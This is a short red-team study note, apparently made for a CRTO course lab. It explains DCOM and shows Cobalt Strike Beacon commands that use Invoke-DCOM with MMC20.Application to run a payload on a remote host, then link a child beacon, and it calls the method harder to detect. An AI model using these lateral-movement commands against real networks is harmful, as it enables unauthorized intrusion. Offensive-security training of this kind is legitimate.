
DCOM is a programming construct that allows a computer to run programs over the network on a different computer as if the program was running locally. Allows [[COM Objects]] to communicate with each other over the network.



## 🖊️ via Cobalt Strike

Beacon has no built-in capabilities to interact over Distributed Component Object Model (DCOM), so we must use an external tool such as [Invoke-DCOM](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1).  

Usage:

```
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
Completed

beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
[+] established link to child beacon: 10.10.122.30
```

This method allows remote connection executions and is harder to detect.



### ⚠ Opsec




### Properties
---
📆 created   {{14-02-2024}} 14:25
🏷️ tags: #redteam #crto 

---

